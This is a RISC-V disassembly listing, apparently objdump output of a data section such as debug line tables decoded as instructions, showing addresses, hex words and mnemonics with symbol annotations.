    1108:	0902                	c.slli64	s2
    110a:	0004                	0x4
    110c:	0501                	addi	a0,a0,0
    110e:	030a                	slli	t1,t1,0x2
    1110:	0900                	addi	s0,sp,144
    1112:	0002                	c.slli64	zero
    1114:	0501                	addi	a0,a0,0
    1116:	0309                	addi	t1,t1,2
    1118:	0901                	addi	s2,s2,0
    111a:	000a                	c.slli	zero,0x2
    111c:	0501                	addi	a0,a0,0
    111e:	04020013          	addi	zero,tp,64 # ffffffffffff8040 <_end+0xffffffff7ffdcb80>
    1122:	0301                	addi	t1,t1,0
    1124:	0900                	addi	s0,sp,144
    1126:	0002                	c.slli64	zero
    1128:	0501                	addi	a0,a0,0
    112a:	0009                	c.nop	2
    112c:	0402                	c.slli64	s0
    112e:	0301                	addi	t1,t1,0
    1130:	0900                	addi	s0,sp,144
    1132:	000a                	c.slli	zero,0x2
    1134:	0501                	addi	a0,a0,0
    1136:	030c                	addi	a1,sp,384
    1138:	0902                	c.slli64	s2
    113a:	0002                	c.slli64	zero
    113c:	0501                	addi	a0,a0,0
    113e:	09020303          	lb	t1,144(tp) # 90 <_tbss_end+0xc>
    1142:	000c                	0xc
    1144:	0501                	addi	a0,a0,0
    1146:	09010313          	addi	t1,sp,144
    114a:	0004                	0x4
    114c:	0501                	addi	a0,a0,0
    114e:	0301                	addi	t1,t1,0
    1150:	0901                	addi	s2,s2,0
    1152:	0002                	c.slli64	zero
    1154:	0301                	addi	t1,t1,0
    1156:	00080907          	0x80907
    115a:	0501                	addi	a0,a0,0
    115c:	09010307          	0x9010307
    1160:	000c                	0xc
    1162:	0501                	addi	a0,a0,0
    1164:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
    1168:	0301                	addi	t1,t1,0
    116a:	0908                	addi	a0,sp,144
    116c:	0004                	0x4
    116e:	0001                	nop
    1170:	0402                	c.slli64	s0
    1172:	0602                	c.slli64	a2
    1174:	0e090003          	lb	zero,224(s2)
    1178:	0100                	addi	s0,sp,128
    117a:	0200                	addi	s0,sp,256
    117c:	0304                	addi	s1,sp,384
    117e:	18090003          	lb	zero,384(s2)
    1182:	0100                	addi	s0,sp,128
    1184:	0200                	addi	s0,sp,256
    1186:	0504                	addi	s1,sp,640
    1188:	38090003          	lb	zero,896(s2)
    118c:	0100                	addi	s0,sp,128
    118e:	0200                	addi	s0,sp,256
    1190:	0104                	addi	s1,sp,128
    1192:	0306                	slli	t1,t1,0x1
    1194:	0901                	addi	s2,s2,0
    1196:	001e                	c.slli	zero,0x7
    1198:	0001                	nop
    119a:	0402                	c.slli64	s0
    119c:	0602                	c.slli64	a2
    119e:	0e090003          	lb	zero,224(s2)
    11a2:	0100                	addi	s0,sp,128
    11a4:	0200                	addi	s0,sp,256
    11a6:	0304                	addi	s1,sp,384
    11a8:	18090003          	lb	zero,384(s2)
    11ac:	0100                	addi	s0,sp,128
    11ae:	0200                	addi	s0,sp,256
    11b0:	0504                	addi	s1,sp,640
    11b2:	38090003          	lb	zero,896(s2)
    11b6:	0100                	addi	s0,sp,128
    11b8:	0105                	addi	sp,sp,1
    11ba:	0200                	addi	s0,sp,256
    11bc:	0504                	addi	s1,sp,640
    11be:	0306                	slli	t1,t1,0x1
    11c0:	001e0903          	lb	s2,1(t3) # 1a001 <_tbss_end+0x19f7d>
    11c4:	0301                	addi	t1,t1,0
    11c6:	00080903          	lb	s2,0(a6)
    11ca:	0501                	addi	a0,a0,0
    11cc:	0312                	slli	t1,t1,0x4
    11ce:	0901                	addi	s2,s2,0
    11d0:	000a                	c.slli	zero,0x2
    11d2:	0501                	addi	a0,a0,0
    11d4:	0318                	addi	a4,sp,384
    11d6:	0900                	addi	s0,sp,144
    11d8:	0006                	c.slli	zero,0x1
    11da:	0501                	addi	a0,a0,0
    11dc:	030a                	slli	t1,t1,0x2
    11de:	0900                	addi	s0,sp,144
    11e0:	0004                	0x4
    11e2:	0501                	addi	a0,a0,0
    11e4:	0009                	c.nop	2
    11e6:	0402                	c.slli64	s0
    11e8:	0301                	addi	t1,t1,0
    11ea:	0901                	addi	s2,s2,0
    11ec:	000a                	c.slli	zero,0x2
    11ee:	0501                	addi	a0,a0,0
    11f0:	0301                	addi	t1,t1,0
    11f2:	0904                	addi	s1,sp,144
    11f4:	0002                	c.slli64	zero
    11f6:	0501                	addi	a0,a0,0
    11f8:	09010303          	lb	t1,144(sp)
    11fc:	0014                	0x14
    11fe:	0501                	addi	a0,a0,0
    1200:	0301                	addi	t1,t1,0
    1202:	0904                	addi	s1,sp,144
    1204:	0008                	0x8
    1206:	0501                	addi	a0,a0,0
    1208:	09010303          	lb	t1,144(sp)
    120c:	000e                	c.slli	zero,0x3
    120e:	0501                	addi	a0,a0,0
    1210:	0301                	addi	t1,t1,0
    1212:	0904                	addi	s1,sp,144
    1214:	000a                	c.slli	zero,0x2
    1216:	0501                	addi	a0,a0,0
    1218:	09010303          	lb	t1,144(sp)
    121c:	0008                	0x8
    121e:	0501                	addi	a0,a0,0
    1220:	0301                	addi	t1,t1,0
    1222:	0904                	addi	s1,sp,144
    1224:	0008                	0x8
    1226:	0501                	addi	a0,a0,0
    1228:	09010303          	lb	t1,144(sp)
    122c:	000e                	c.slli	zero,0x3
    122e:	0501                	addi	a0,a0,0
    1230:	0301                	addi	t1,t1,0
    1232:	0901                	addi	s2,s2,0
    1234:	001c                	0x1c
    1236:	0301                	addi	t1,t1,0
    1238:	000c0903          	lb	s2,0(s8) # 1d000 <_tbss_end+0x1cf7c>
    123c:	0501                	addi	a0,a0,0
    123e:	0009                	c.nop	2
    1240:	0402                	c.slli64	s0
    1242:	0301                	addi	t1,t1,0
    1244:	00140903          	lb	s2,1(s0) # ffffffffffffd001 <_end+0xffffffff7ffe1b41>
    1248:	0501                	addi	a0,a0,0
    124a:	0301                	addi	t1,t1,0
    124c:	0901                	addi	s2,s2,0
    124e:	0008                	0x8
    1250:	0301                	addi	t1,t1,0
    1252:	000a0903          	lb	s2,0(s4)
    1256:	0501                	addi	a0,a0,0
    1258:	09020303          	lb	t1,144(tp) # 90 <_tbss_end+0xc>
    125c:	0012                	c.slli	zero,0x4
    125e:	0501                	addi	a0,a0,0
    1260:	030a                	slli	t1,t1,0x2
    1262:	0901                	addi	s2,s2,0
    1264:	000c                	0xc
    1266:	0501                	addi	a0,a0,0
    1268:	0301                	addi	t1,t1,0
    126a:	0901                	addi	s2,s2,0
    126c:	0002                	c.slli64	zero
    126e:	0301                	addi	t1,t1,0
    1270:	000a0903          	lb	s2,0(s4)
    1274:	0501                	addi	a0,a0,0
    1276:	09040323          	sb	a6,134(s0)
    127a:	0008                	0x8
    127c:	0501                	addi	a0,a0,0
    127e:	030a                	slli	t1,t1,0x2
    1280:	0900                	addi	s0,sp,144
    1282:	000c                	0xc
    1284:	0501                	addi	a0,a0,0
    1286:	09010303          	lb	t1,144(sp)
    128a:	0004                	0x4
    128c:	0501                	addi	a0,a0,0
    128e:	0321                	addi	t1,t1,8
    1290:	0901                	addi	s2,s2,0
    1292:	0014                	0x14
    1294:	0501                	addi	a0,a0,0
    1296:	030a                	slli	t1,t1,0x2
    1298:	0900                	addi	s0,sp,144
    129a:	000c                	0xc
    129c:	0501                	addi	a0,a0,0
    129e:	09010303          	lb	t1,144(sp)
    12a2:	0004                	0x4
    12a4:	0501                	addi	a0,a0,0
    12a6:	0301                	addi	t1,t1,0
    12a8:	0901                	addi	s2,s2,0
    12aa:	0014                	0x14
    12ac:	0301                	addi	t1,t1,0
    12ae:	000a0903          	lb	s2,0(s4)
    12b2:	0501                	addi	a0,a0,0
    12b4:	09010303          	lb	t1,144(sp)
    12b8:	0032                	c.slli	zero,0xc
    12ba:	0301                	addi	t1,t1,0
    12bc:	0901                	addi	s2,s2,0
    12be:	0004                	0x4
    12c0:	0501                	addi	a0,a0,0
    12c2:	030d                	addi	t1,t1,3
    12c4:	00100903          	lb	s2,1(zero) # 1 <_tdata_begin+0x1>
    12c8:	0501                	addi	a0,a0,0
    12ca:	0309                	addi	t1,t1,2
    12cc:	000e0903          	lb	s2,0(t3)
    12d0:	0501                	addi	a0,a0,0
    12d2:	030c                	addi	a1,sp,384
    12d4:	0901                	addi	s2,s2,0
    12d6:	0004                	0x4
    12d8:	0501                	addi	a0,a0,0
    12da:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
    12de:	0004                	0x4
    12e0:	0501                	addi	a0,a0,0
    12e2:	0311                	addi	t1,t1,4
    12e4:	0901                	addi	s2,s2,0
    12e6:	0002                	c.slli64	zero
    12e8:	0501                	addi	a0,a0,0
    12ea:	0308                	addi	a0,sp,384
    12ec:	0900                	addi	s0,sp,144
    12ee:	0012                	c.slli	zero,0x4
    12f0:	0501                	addi	a0,a0,0
    12f2:	0901030f          	0x901030f
    12f6:	0002                	c.slli64	zero
    12f8:	0501                	addi	a0,a0,0
    12fa:	030c                	addi	a1,sp,384
    12fc:	0900                	addi	s0,sp,144
    12fe:	003a                	c.slli	zero,0xe
    1300:	0501                	addi	a0,a0,0
    1302:	0026                	c.slli	zero,0x9
    1304:	0402                	c.slli64	s0
    1306:	0302                	c.slli64	t1
    1308:	097e                	slli	s2,s2,0x1f
    130a:	000a                	c.slli	zero,0x2
    130c:	0501                	addi	a0,a0,0
    130e:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
    1312:	0301                	addi	t1,t1,0
    1314:	0900                	addi	s0,sp,144
    1316:	000a                	c.slli	zero,0x2
    1318:	0501                	addi	a0,a0,0
    131a:	0306                	slli	t1,t1,0x1
    131c:	000e0903          	lb	s2,0(t3)
    1320:	0501                	addi	a0,a0,0
    1322:	0305                	addi	t1,t1,1
    1324:	0901                	addi	s2,s2,0
    1326:	0008                	0x8
    1328:	0501                	addi	a0,a0,0
    132a:	09020303          	lb	t1,144(tp) # 90 <_tbss_end+0xc>
    132e:	0006                	c.slli	zero,0x1
    1330:	0501                	addi	a0,a0,0
    1332:	0301                	addi	t1,t1,0
    1334:	0905                	addi	s2,s2,1
    1336:	000a                	c.slli	zero,0x2
    1338:	0501                	addi	a0,a0,0
    133a:	030d                	addi	t1,t1,3
    133c:	0904                	addi	s1,sp,144
    133e:	000e                	c.slli	zero,0x3
    1340:	0501                	addi	a0,a0,0
    1342:	0311                	addi	t1,t1,4
    1344:	0900                	addi	s0,sp,144
    1346:	0010                	0x10
    1348:	0501                	addi	a0,a0,0
    134a:	0306                	slli	t1,t1,0x1
    134c:	0902                	c.slli64	s2
    134e:	0012                	c.slli	zero,0x4
    1350:	0501                	addi	a0,a0,0
    1352:	001c                	0x1c
    1354:	0402                	c.slli64	s0
    1356:	0301                	addi	t1,t1,0
    1358:	0900                	addi	s0,sp,144
    135a:	000e                	c.slli	zero,0x3
    135c:	0501                	addi	a0,a0,0
    135e:	0012                	c.slli	zero,0x4
    1360:	0402                	c.slli64	s0
    1362:	0301                	addi	t1,t1,0
    1364:	0900                	addi	s0,sp,144
    1366:	0004                	0x4
    1368:	0501                	addi	a0,a0,0
    136a:	0305                	addi	t1,t1,1
    136c:	0902                	c.slli64	s2
    136e:	000a                	c.slli	zero,0x2
    1370:	0501                	addi	a0,a0,0
    1372:	030c                	addi	a1,sp,384
    1374:	0901                	addi	s2,s2,0
    1376:	0016                	c.slli	zero,0x5
    1378:	0501                	addi	a0,a0,0
    137a:	030a                	slli	t1,t1,0x2
    137c:	00040903          	lb	s2,0(s0)
    1380:	0501                	addi	a0,a0,0
    1382:	0301                	addi	t1,t1,0
    1384:	0901                	addi	s2,s2,0
    1386:	0002                	c.slli64	zero
    1388:	0301                	addi	t1,t1,0
    138a:	000a0903          	lb	s2,0(s4)
    138e:	0501                	addi	a0,a0,0
    1390:	030a                	slli	t1,t1,0x2
    1392:	000c0903          	lb	s2,0(s8)
    1396:	0501                	addi	a0,a0,0
    1398:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
    139c:	0004                	0x4
    139e:	0501                	addi	a0,a0,0
    13a0:	0314                	addi	a3,sp,384
    13a2:	0902                	c.slli64	s2
    13a4:	0002                	c.slli64	zero
    13a6:	0501                	addi	a0,a0,0
    13a8:	0321                	addi	t1,t1,8
    13aa:	0900                	addi	s0,sp,144
    13ac:	000e                	c.slli	zero,0x3
    13ae:	0501                	addi	a0,a0,0
    13b0:	0900031b          	addiw	t1,zero,144
    13b4:	0008                	0x8
    13b6:	0001                	nop
    13b8:	0402                	c.slli64	s0
    13ba:	0601                	addi	a2,a2,0
    13bc:	06090003          	lb	zero,96(s2)
    13c0:	0100                	addi	s0,sp,128
    13c2:	0200                	addi	s0,sp,256
    13c4:	0204                	addi	s1,sp,256
    13c6:	06090003          	lb	zero,96(s2)
    13ca:	0100                	addi	s0,sp,128
    13cc:	0b05                	addi	s6,s6,1
    13ce:	0200                	addi	s0,sp,256
    13d0:	0404                	addi	s1,sp,512
    13d2:	0306                	slli	t1,t1,0x1
    13d4:	0900                	addi	s0,sp,144
    13d6:	0004                	0x4
    13d8:	0501                	addi	a0,a0,0
    13da:	0402001b          	addiw	zero,tp,64
    13de:	0304                	addi	s1,sp,384
    13e0:	0900                	addi	s0,sp,144
    13e2:	000c                	0xc
    13e4:	0501                	addi	a0,a0,0
    13e6:	0402000f          	0x402000f
    13ea:	0304                	addi	s1,sp,384
    13ec:	0900                	addi	s0,sp,144
    13ee:	0006                	c.slli	zero,0x1
    13f0:	0501                	addi	a0,a0,0
    13f2:	04020007          	0x4020007
    13f6:	0304                	addi	s1,sp,384
    13f8:	0901                	addi	s2,s2,0
    13fa:	000a                	c.slli	zero,0x2
    13fc:	0501                	addi	a0,a0,0
    13fe:	0018                	0x18
    1400:	0402                	c.slli64	s0
    1402:	0304                	addi	s1,sp,384
    1404:	097d                	addi	s2,s2,31
    1406:	000a                	c.slli	zero,0x2
    1408:	0501                	addi	a0,a0,0
    140a:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
    140e:	0302                	c.slli64	t1
    1410:	0900                	addi	s0,sp,144
    1412:	000a                	c.slli	zero,0x2
    1414:	0501                	addi	a0,a0,0
    1416:	0905030b          	0x905030b
    141a:	000e                	c.slli	zero,0x3
    141c:	0501                	addi	a0,a0,0
    141e:	09020303          	lb	t1,144(tp) # 90 <_tbss_end+0xc>
    1422:	0004                	0x4
    1424:	0501                	addi	a0,a0,0
    1426:	0301                	addi	t1,t1,0
    1428:	0901                	addi	s2,s2,0
    142a:	000a                	c.slli	zero,0x2
    142c:	0301                	addi	t1,t1,0
    142e:	0904                	addi	s1,sp,144
    1430:	000a                	c.slli	zero,0x2
    1432:	0501                	addi	a0,a0,0
    1434:	09020307          	0x9020307
    1438:	002c                	addi	a1,sp,8
    143a:	0501                	addi	a0,a0,0
    143c:	09040317          	auipc	t1,0x9040
    1440:	0004                	0x4
    1442:	0501                	addi	a0,a0,0
    1444:	030d                	addi	t1,t1,3
    1446:	0900                	addi	s0,sp,144
    1448:	000c                	0xc
    144a:	0501                	addi	a0,a0,0
    144c:	0311                	addi	t1,t1,4
    144e:	0900                	addi	s0,sp,144
    1450:	000c                	0xc
    1452:	0501                	addi	a0,a0,0
    1454:	030d                	addi	t1,t1,3
    1456:	0901                	addi	s2,s2,0
    1458:	0010                	0x10
    145a:	0501                	addi	a0,a0,0
    145c:	0308                	addi	a0,sp,384
    145e:	0900                	addi	s0,sp,144
    1460:	0004                	0x4
    1462:	0501                	addi	a0,a0,0
    1464:	0309                	addi	t1,t1,2
    1466:	0902                	c.slli64	s2
    1468:	0008                	0x8
    146a:	0501                	addi	a0,a0,0
    146c:	0311                	addi	t1,t1,4
    146e:	097d                	addi	s2,s2,31
    1470:	0010                	0x10
    1472:	0501                	addi	a0,a0,0
    1474:	09020307          	0x9020307
    1478:	0002                	c.slli64	zero
    147a:	0501                	addi	a0,a0,0
    147c:	0309                	addi	t1,t1,2
    147e:	0904                	addi	s1,sp,144
    1480:	0002                	c.slli64	zero
    1482:	0501                	addi	a0,a0,0
    1484:	0305                	addi	t1,t1,1
    1486:	0901                	addi	s2,s2,0
    1488:	0002                	c.slli64	zero
    148a:	0501                	addi	a0,a0,0
    148c:	097f030f          	0x97f030f
    1490:	0010                	0x10
    1492:	0501                	addi	a0,a0,0
    1494:	0309                	addi	t1,t1,2
    1496:	0900                	addi	s0,sp,144
    1498:	000c                	0xc
    149a:	0301                	addi	t1,t1,0
    149c:	000a0903          	lb	s2,0(s4)
    14a0:	0501                	addi	a0,a0,0
    14a2:	0901030f          	0x901030f
    14a6:	0002                	c.slli64	zero
    14a8:	0501                	addi	a0,a0,0
    14aa:	031c                	addi	a5,sp,384
    14ac:	0900                	addi	s0,sp,144
    14ae:	0010                	0x10
    14b0:	0501                	addi	a0,a0,0
    14b2:	09000333          	0x9000333
    14b6:	0010                	0x10
    14b8:	0001                	nop
    14ba:	0402                	c.slli64	s0
    14bc:	0601                	addi	a2,a2,0
    14be:	08090003          	lb	zero,128(s2)
    14c2:	0100                	addi	s0,sp,128
    14c4:	0200                	addi	s0,sp,256
    14c6:	0204                	addi	s1,sp,256
    14c8:	06090003          	lb	zero,96(s2)
    14cc:	0100                	addi	s0,sp,128
    14ce:	1505                	addi	a0,a0,-31
    14d0:	0200                	addi	s0,sp,256
    14d2:	0404                	addi	s1,sp,512
    14d4:	0306                	slli	t1,t1,0x1
    14d6:	0900                	addi	s0,sp,144
    14d8:	0004                	0x4
    14da:	0501                	addi	a0,a0,0
    14dc:	0005                	c.nop	1
    14de:	0402                	c.slli64	s0
    14e0:	0304                	addi	s1,sp,384
    14e2:	0900                	addi	s0,sp,144
    14e4:	0004                	0x4
    14e6:	0501                	addi	a0,a0,0
    14e8:	030d                	addi	t1,t1,3
    14ea:	097f                	0x97f
    14ec:	000e                	c.slli	zero,0x3
    14ee:	0501                	addi	a0,a0,0
    14f0:	0309                	addi	t1,t1,2
    14f2:	0900                	addi	s0,sp,144
    14f4:	000c                	0xc
    14f6:	0501                	addi	a0,a0,0
    14f8:	0301                	addi	t1,t1,0
    14fa:	0902                	c.slli64	s2
    14fc:	0004                	0x4
    14fe:	0301                	addi	t1,t1,0
    1500:	000c0903          	lb	s2,0(s8)
    1504:	0501                	addi	a0,a0,0
    1506:	0306                	slli	t1,t1,0x1
    1508:	0901                	addi	s2,s2,0
    150a:	0010                	0x10
    150c:	0501                	addi	a0,a0,0
    150e:	030c                	addi	a1,sp,384
    1510:	0901                	addi	s2,s2,0
    1512:	000e                	c.slli	zero,0x3
    1514:	0501                	addi	a0,a0,0
    1516:	0901030b          	0x901030b
    151a:	0014                	0x14
    151c:	0501                	addi	a0,a0,0
    151e:	030c                	addi	a1,sp,384
    1520:	0901                	addi	s2,s2,0
    1522:	0008                	0x8
    1524:	0301                	addi	t1,t1,0
    1526:	0902                	c.slli64	s2
    1528:	0014                	0x14
    152a:	0501                	addi	a0,a0,0
    152c:	0301                	addi	t1,t1,0
    152e:	0901                	addi	s2,s2,0
    1530:	0016                	c.slli	zero,0x5
    1532:	0301                	addi	t1,t1,0
    1534:	00080903          	lb	s2,0(a6)
    1538:	0501                	addi	a0,a0,0
    153a:	0306                	slli	t1,t1,0x1
    153c:	0901                	addi	s2,s2,0
    153e:	0010                	0x10
    1540:	0501                	addi	a0,a0,0
    1542:	030c                	addi	a1,sp,384
    1544:	0901                	addi	s2,s2,0
    1546:	000e                	c.slli	zero,0x3
    1548:	0501                	addi	a0,a0,0
    154a:	0901030b          	0x901030b
    154e:	0014                	0x14
    1550:	0501                	addi	a0,a0,0
    1552:	030c                	addi	a1,sp,384
    1554:	0901                	addi	s2,s2,0
    1556:	0008                	0x8
    1558:	0301                	addi	t1,t1,0
    155a:	0902                	c.slli64	s2
    155c:	0014                	0x14
    155e:	0501                	addi	a0,a0,0
    1560:	0301                	addi	t1,t1,0
    1562:	0901                	addi	s2,s2,0
    1564:	0012                	c.slli	zero,0x4
    1566:	0301                	addi	t1,t1,0
    1568:	00080903          	lb	s2,0(a6)
    156c:	0501                	addi	a0,a0,0
    156e:	0909030b          	0x909030b
    1572:	001c                	0x1c
    1574:	0501                	addi	a0,a0,0
    1576:	030a                	slli	t1,t1,0x2
    1578:	0901                	addi	s2,s2,0
    157a:	0002                	c.slli64	zero
    157c:	0301                	addi	t1,t1,0
    157e:	0902                	c.slli64	s2
    1580:	0004                	0x4
    1582:	0501                	addi	a0,a0,0
    1584:	09010307          	0x9010307
    1588:	000a                	c.slli	zero,0x2
    158a:	0501                	addi	a0,a0,0
    158c:	0312                	slli	t1,t1,0x4
    158e:	097c                	addi	a5,sp,156
    1590:	000c                	0xc
    1592:	0501                	addi	a0,a0,0
    1594:	0310                	addi	a2,sp,384
    1596:	0900                	addi	s0,sp,144
    1598:	0008                	0x8
    159a:	0501                	addi	a0,a0,0
    159c:	0900030b          	0x900030b
    15a0:	0004                	0x4
    15a2:	0501                	addi	a0,a0,0
    15a4:	0308                	addi	a0,sp,384
    15a6:	0906                	slli	s2,s2,0x1
    15a8:	000a                	c.slli	zero,0x2
    15aa:	0501                	addi	a0,a0,0
    15ac:	030e                	slli	t1,t1,0x3
    15ae:	000a0903          	lb	s2,0(s4)
    15b2:	0501                	addi	a0,a0,0
    15b4:	030a                	slli	t1,t1,0x2
    15b6:	0901                	addi	s2,s2,0
    15b8:	0008                	0x8
    15ba:	0501                	addi	a0,a0,0
    15bc:	0901030b          	0x901030b
    15c0:	0008                	0x8
    15c2:	0501                	addi	a0,a0,0
    15c4:	0901030f          	0x901030f
    15c8:	0006                	c.slli	zero,0x1
    15ca:	0501                	addi	a0,a0,0
    15cc:	0901030b          	0x901030b
    15d0:	0006                	c.slli	zero,0x1
    15d2:	0501                	addi	a0,a0,0
    15d4:	030d                	addi	t1,t1,3
    15d6:	0901                	addi	s2,s2,0
    15d8:	0004                	0x4
    15da:	0501                	addi	a0,a0,0
    15dc:	09020313          	addi	t1,tp,144 # 90 <_tbss_end+0xc>
    15e0:	0004                	0x4
    15e2:	0501                	addi	a0,a0,0
    15e4:	0312                	slli	t1,t1,0x4
    15e6:	0900                	addi	s0,sp,144
    15e8:	000c                	0xc
    15ea:	0501                	addi	a0,a0,0
    15ec:	0310                	addi	a2,sp,384
    15ee:	0900                	addi	s0,sp,144
    15f0:	0004                	0x4
    15f2:	0501                	addi	a0,a0,0
    15f4:	030c                	addi	a1,sp,384
    15f6:	0904                	addi	s1,sp,144
    15f8:	003a                	c.slli	zero,0xe
    15fa:	0501                	addi	a0,a0,0
    15fc:	09010307          	0x9010307
    1600:	0008                	0x8
    1602:	0501                	addi	a0,a0,0
    1604:	030c                	addi	a1,sp,384
    1606:	0904                	addi	s1,sp,144
    1608:	0002                	c.slli64	zero
    160a:	0501                	addi	a0,a0,0
    160c:	09010307          	0x9010307
    1610:	0008                	0x8
    1612:	0501                	addi	a0,a0,0
    1614:	0316                	slli	t1,t1,0x5
    1616:	090c                	addi	a1,sp,144
    1618:	0002                	c.slli64	zero
    161a:	0501                	addi	a0,a0,0
    161c:	031f 0901 0004      	0x40901031f
    1622:	0501                	addi	a0,a0,0
    1624:	0324                	addi	s1,sp,392
    1626:	0900                	addi	s0,sp,144
    1628:	0012                	c.slli	zero,0x4
    162a:	0501                	addi	a0,a0,0
    162c:	09000313          	li	t1,144
    1630:	0004                	0x4
    1632:	0501                	addi	a0,a0,0
    1634:	030e                	slli	t1,t1,0x3
    1636:	0901                	addi	s2,s2,0
    1638:	0008                	0x8
    163a:	0501                	addi	a0,a0,0
    163c:	030c                	addi	a1,sp,384
    163e:	0900                	addi	s0,sp,144
    1640:	0008                	0x8
    1642:	0301                	addi	t1,t1,0
    1644:	0901                	addi	s2,s2,0
    1646:	0004                	0x4
    1648:	0501                	addi	a0,a0,0
    164a:	0016                	c.slli	zero,0x5
    164c:	0402                	c.slli64	s0
    164e:	0301                	addi	t1,t1,0
    1650:	0900                	addi	s0,sp,144
    1652:	000a                	c.slli	zero,0x2
    1654:	0501                	addi	a0,a0,0
    1656:	031d                	addi	t1,t1,7
    1658:	097d                	addi	s2,s2,31
    165a:	000a                	c.slli	zero,0x2
    165c:	0501                	addi	a0,a0,0
    165e:	09010313          	addi	t1,sp,144
    1662:	000a                	c.slli	zero,0x2
    1664:	0501                	addi	a0,a0,0
    1666:	0311                	addi	t1,t1,4
    1668:	0908                	addi	a0,sp,144
    166a:	0002                	c.slli64	zero
    166c:	0501                	addi	a0,a0,0
    166e:	09010307          	0x9010307
    1672:	0012                	c.slli	zero,0x4
    1674:	0501                	addi	a0,a0,0
    1676:	030a                	slli	t1,t1,0x2
    1678:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
    167c:	0501                	addi	a0,a0,0
    167e:	0901030f          	0x901030f
    1682:	000a                	c.slli	zero,0x2
    1684:	0501                	addi	a0,a0,0
    1686:	09010307          	0x9010307
    168a:	0004                	0x4
    168c:	0501                	addi	a0,a0,0
    168e:	0903030f          	0x903030f
    1692:	0002                	c.slli64	zero
    1694:	0501                	addi	a0,a0,0
    1696:	09010307          	0x9010307
    169a:	0006                	c.slli	zero,0x1
    169c:	0301                	addi	t1,t1,0
    169e:	00020973          	0x20973
    16a2:	0501                	addi	a0,a0,0
    16a4:	030a                	slli	t1,t1,0x2
    16a6:	0910                	addi	a2,sp,144
    16a8:	0002                	c.slli64	zero
    16aa:	0501                	addi	a0,a0,0
    16ac:	0901030f          	0x901030f
    16b0:	000a                	c.slli	zero,0x2
    16b2:	0501                	addi	a0,a0,0
    16b4:	0326                	slli	t1,t1,0x9
    16b6:	0900                	addi	s0,sp,144
    16b8:	0008                	0x8
    16ba:	0501                	addi	a0,a0,0
    16bc:	09010307          	0x9010307
    16c0:	0006                	c.slli	zero,0x1
    16c2:	0501                	addi	a0,a0,0
    16c4:	030c                	addi	a1,sp,384
    16c6:	0904                	addi	s1,sp,144
    16c8:	0002                	c.slli64	zero
    16ca:	0501                	addi	a0,a0,0
    16cc:	09010307          	0x9010307
    16d0:	000a                	c.slli	zero,0x2
    16d2:	0301                	addi	t1,t1,0
    16d4:	0904                	addi	s1,sp,144
    16d6:	0002                	c.slli64	zero
    16d8:	0301                	addi	t1,t1,0
    16da:	0901                	addi	s2,s2,0
    16dc:	001a                	c.slli	zero,0x6
    16de:	0501                	addi	a0,a0,0
    16e0:	030e                	slli	t1,t1,0x3
    16e2:	0904                	addi	s1,sp,144
    16e4:	0002                	c.slli64	zero
    16e6:	0501                	addi	a0,a0,0
    16e8:	030a                	slli	t1,t1,0x2
    16ea:	0900                	addi	s0,sp,144
    16ec:	0010                	0x10
    16ee:	0501                	addi	a0,a0,0
    16f0:	0901030b          	0x901030b
    16f4:	0004                	0x4
    16f6:	0501                	addi	a0,a0,0
    16f8:	030a                	slli	t1,t1,0x2
    16fa:	0901                	addi	s2,s2,0
    16fc:	0008                	0x8
    16fe:	0501                	addi	a0,a0,0
    1700:	0015                	c.nop	5
    1702:	0402                	c.slli64	s0
    1704:	0301                	addi	t1,t1,0
    1706:	0900                	addi	s0,sp,144
    1708:	000a                	c.slli	zero,0x2
    170a:	0501                	addi	a0,a0,0
    170c:	0314                	addi	a3,sp,384
    170e:	0901                	addi	s2,s2,0
    1710:	0010                	0x10
    1712:	0501                	addi	a0,a0,0
    1714:	09000317          	auipc	t1,0x9000
    1718:	0004                	0x4
    171a:	0501                	addi	a0,a0,0
    171c:	0314                	addi	a3,sp,384
    171e:	0900                	addi	s0,sp,144
    1720:	000e                	c.slli	zero,0x3
    1722:	0501                	addi	a0,a0,0
    1724:	0309                	addi	t1,t1,2
    1726:	0900                	addi	s0,sp,144
    1728:	000c                	0xc
    172a:	0501                	addi	a0,a0,0
    172c:	0402000b          	0x402000b
    1730:	09010303          	lb	t1,144(sp)
    1734:	0002                	c.slli64	zero
    1736:	0501                	addi	a0,a0,0
    1738:	003e                	c.slli	zero,0xf
    173a:	0402                	c.slli64	s0
    173c:	097f0303          	lb	t1,151(t5) # 18097 <_tbss_end+0x18013>
    1740:	0012                	c.slli	zero,0x4
    1742:	0501                	addi	a0,a0,0
    1744:	0009                	c.nop	2
    1746:	0402                	c.slli64	s0
    1748:	0301                	addi	t1,t1,0
    174a:	0900                	addi	s0,sp,144
    174c:	000a                	c.slli	zero,0x2
    174e:	0501                	addi	a0,a0,0
    1750:	09020307          	0x9020307
    1754:	000a                	c.slli	zero,0x2
    1756:	0501                	addi	a0,a0,0
    1758:	0009                	c.nop	2
    175a:	0402                	c.slli64	s0
    175c:	0305                	addi	t1,t1,1
    175e:	0901                	addi	s2,s2,0
    1760:	0002                	c.slli64	zero
    1762:	0501                	addi	a0,a0,0
    1764:	000a                	c.slli	zero,0x2
    1766:	0402                	c.slli64	s0
    1768:	0305                	addi	t1,t1,1
    176a:	0901                	addi	s2,s2,0
    176c:	000c                	0xc
    176e:	0501                	addi	a0,a0,0
    1770:	004d                	c.nop	19
    1772:	0402                	c.slli64	s0
    1774:	0305                	addi	t1,t1,1
    1776:	097e                	slli	s2,s2,0x1f
    1778:	0002                	c.slli64	zero
    177a:	0501                	addi	a0,a0,0
    177c:	0014                	0x14
    177e:	0402                	c.slli64	s0
    1780:	0301                	addi	t1,t1,0
    1782:	0900                	addi	s0,sp,144
    1784:	000a                	c.slli	zero,0x2
    1786:	0501                	addi	a0,a0,0
    1788:	0012                	c.slli	zero,0x4
    178a:	0402                	c.slli64	s0
    178c:	0301                	addi	t1,t1,0
    178e:	0900                	addi	s0,sp,144
    1790:	0004                	0x4
    1792:	0501                	addi	a0,a0,0
    1794:	04020007          	0x4020007
    1798:	0301                	addi	t1,t1,0
    179a:	0900                	addi	s0,sp,144
    179c:	0004                	0x4
    179e:	0501                	addi	a0,a0,0
    17a0:	0020                	addi	s0,sp,8
    17a2:	0402                	c.slli64	s0
    17a4:	0302                	c.slli64	t1
    17a6:	0900                	addi	s0,sp,144
